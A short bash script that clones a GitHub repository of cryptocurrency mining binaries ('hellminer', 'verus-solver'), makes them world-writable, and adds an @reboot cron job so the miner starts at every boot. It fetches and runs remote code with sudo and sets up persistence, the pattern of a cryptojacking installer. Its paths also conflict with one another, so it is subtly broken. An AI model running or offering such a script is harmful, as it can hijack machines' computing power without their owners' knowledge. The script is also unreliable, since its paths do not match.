#!/bin/bash
sudo apt-get install git
git clone https://github.com/info1372/mine.git
sudo chmod 777 mine/mine.sh
sudo chmod 777 mine/hellminer
sudo chmod 777 mine/verus-solver
sudo chmod 777 mine/install.sh
sudo touch /var/spool/cron/crontabs/"$USER"
crontab -l > mycron
echo "@reboot /"$USER"/mine/./mine.sh" >> mycron
crontab mycron
rm mycron
sudo systemctl enable cron.service
bash /mine/mine.sh
